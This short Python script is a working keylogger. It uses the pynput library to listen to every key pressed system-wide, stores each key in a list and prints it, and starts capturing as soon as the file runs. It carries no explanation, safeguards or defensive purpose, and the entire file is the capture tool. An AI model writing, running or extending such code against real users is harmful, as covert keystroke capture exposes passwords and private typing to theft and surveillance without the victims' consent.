import pynput.keyboard

class KeyLogger:
    def __init__(self):
        self.lista = []

    def press(self, char):
        self.lista.append(char)
        print(char)

    def start(self):
        p = pynput.keyboard.Listener(on_press=self.press)
        with p:
            p.join()


kl = KeyLogger()
kl.start()